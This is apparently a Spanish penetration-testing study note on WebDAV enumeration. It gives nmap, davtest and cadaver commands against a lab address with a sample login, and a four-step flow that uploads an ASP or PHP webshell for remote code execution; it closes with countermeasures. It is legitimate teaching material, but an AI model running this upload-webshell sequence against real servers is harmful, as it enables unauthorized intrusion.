---
title: Enumeración y Prueba de WebDAV
slug: enumeracion-webdav
aliases: [Enumeración y Prueba de WebDAV]
fase: [Enumeración]
plataforma: Web
dificultad: Intermedia
mitre: [T1046, T1190]
related: []
learning_refs: []
---

# Enumeración y Prueba de WebDAV

## Descripción
WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite a los clientes crear, modificar y mover documentos en un servidor web remoto. Extiende HTTP con métodos adicionales: PUT, DELETE, PROPFIND, MKCOL, COPY, MOVE. Cuando esta habilitado y mal configurado (especialmente en IIS), puede permitir subir archivos ejecutables y obtener ejecución remota de código. La enumeración implica detectar si esta activo, identificar métodos permitidos y probar que tipos de archivo se pueden subir y ejecutar.

## Herramientas
- **nmap** (`http-webdav-scan`) — detecta WebDAV y lista métodos permitidos
- **davtest** — prueba que tipos de archivo se pueden subir y ejecutar vía WebDAV
- **cadaver** — cliente WebDAV interactivo para listar, subir y descargar archivos

## Comandos / Ejemplos

```bash
# 1. Deteccion de WebDAV con nmap
nmap -sV -p 80 --script http-webdav-scan \
  --script-args http-methods.url-path=/webdav/ 10.4.17.80

# Resultado esperado:
# | http-webdav-scan:
# |   WebDAV type: Apache DAV
# |   Allowed Methods: GET HEAD OPTIONS PROPFIND PUT LOCK UNLOCK DELETE

# 2. davtest - probar conexion y tipos de archivo ejecutables
davtest -auth bob:password_123321 -url http://10.4.17.80/webdav
# Sin autenticacion:
davtest -url http://TARGET/webdav

# Resultado davtest (prueba cada extension):
# SUCCEED: txt
# SUCCEED: html
# SUCCEED: php  <-- critico: permite RCE
# SUCCEED: asp
# SUCCEED: aspx
# FAIL:    jsp

# 3. cadaver - cliente WebDAV interactivo
cadaver http://10.4.17.80/webdav
# Con autenticacion:
# Username: bob
# Password: password_123321

# Comandos dentro de cadaver:
dav:/webdav/> ls                               # listar contenido
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp   # subir webshell
dav:/webdav/> put shell.php                    # subir shell PHP
dav:/webdav/> get archivo.txt                  # descargar archivo
dav:/webdav/> delete archivo.txt               # eliminar archivo
```

**Flujo típico de ataque:**
1. `nmap http-webdav-scan` → confirmar WebDAV activo
2. `davtest` → identificar que extensiones son ejecutables
3. `cadaver` → subir webshell con la extensión permitida
4. Acceder a la webshell vía navegador para RCE

## Contramedidas
- Deshabilitar WebDAV si no se usa (`LoadModule dav_module` en Apache, módulo WebDAV en IIS)
- Si se necesita WebDAV, requerir autenticación fuerte (no basic auth sin TLS)
- Restringir métodos HTTP a solo los necesarios (denegar PUT, DELETE por defecto)
- Configurar listas blancas de extensiones de archivo permitidas para subida
- Monitorear accesos a rutas WebDAV en los logs del servidor web

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1046: Network Service Discovery. https://attack.mitre.org/techniques/T1046/
